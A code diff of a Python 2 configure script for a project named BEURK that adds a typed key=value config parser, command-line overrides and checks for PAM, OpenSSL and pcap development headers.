@@ -1,18 +1,73 @@
 #!/usr/bin/env python2
 
-import sys, re, os.path
+import sys, os
+from pprint import pprint
 
-# check if dependencies are satisfied
+# special types for config var values
+def type_str(v):
+    assert str(v)
+    return str(v)
+
+def type_bool(v):
+    assert v.lower() in ["true", "false"]
+    return True if v.lower() == "true" else False
+
+def type_int(v):
+    return int(v)
+
+# the list of config keys (with their associated expected type)
+CONFIG_KEYS = {
+        "LIBRARY_NAME": type_str,
+        "DEBUG_LEVEL": type_int,
+        "ENABLE_PTRACE": type_bool,
+        "ENABLE_PAM": type_bool,
+        "ENABLE_PCAP": type_bool,
+        "ENABLE_SSL": type_bool,
+        }
+
+
+def help():
+    """display usage help message and exit
+    """
+    print("Usage: %s <config-file> [KEY=val ...]" % sys.argv[0])
+    sys.exit(1)
+
+
+def get_config(lines):
+    result = {}
+    for lineno, line in enumerate(lines, 1):
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if '=' not in line:
+            raise SyntaxError("line %d: expected key=val" % lineno)
+        key, val = [x.strip() for x in line.split("=", 1)]
+        if key in result.keys():
+            raise SyntaxError("line %d: %r declared twice" % (lineno, key))
+        if key not in CONFIG_KEYS.keys():
+            raise SyntaxError("line %d: unknown key: %r" % (lineno, key))
+        func_ptr = CONFIG_KEYS[key]
+        try:
+            val = func_ptr(val)
+        except Exception as e:
+            func_name = func_ptr.__name__.replace("_", " ")
+            msg = "line %d: %r expects %s"
+            raise SyntaxError(msg % (lineno, key, func_name))
+        result[key] = val
+    return result
+
+
 def check_lib_dependencies():
+    """test current system for BEURK dependencies
+    """
     deps = {"libpam": "security/pam_appl.h",
             "libssl": "openssl/sha.h",
             "libpcap": "pcap/pcap.h"}
-    
     include_path = [
             "/usr/include",
             "/usr/local/include"]
-
     missing_deps = 0
+
     for dep, header in deps.items():
         for include_dir in include_path:
             header_path = os.path.join(include_dir, header)
@@ -22,16 +77,29 @@ def check_lib_dependencies():
             msg = "Dependency not satisfied: %s-dev (header files)."
             sys.stderr.write("%s\n" % msg % dependency)
             missing_deps += 1
-    if missing_dep:
-        sys.exit(1)
+    return False if missing_deps else True
 
 
-MAKEFILE_TEMPLATE = """
-all: {libname}
+### parse arguments
 
-{libname}:
-    @echo "--> calling {libname} target"
+if len(sys.argv) < 2:
+    help()
 
-clean:
-    @echo "--> calling clean target"
-"""
+try:
+    config_lines = open(sys.argv[1]).read().splitlines()
+    config = get_config(config_lines)
+except Exception as e:
+    sys.stderr.write("config file error: %s:\n" % sys.argv[1])
+    sys.exit("-> %s" % e)
+
+for argnum, keyval in enumerate(sys.argv[2:], 2):
+    try:
+        config.update(get_config([keyval]))
+    except SyntaxError as e:
+        e = str(e)
+        if e.startswith("line 1:"):
+            e = "argument %d: %s" % (argnum, e[8:])
+        sys.stderr.write("variable override error:\n")
+        sys.exit("-> %s" % e)
+
+pprint(config)
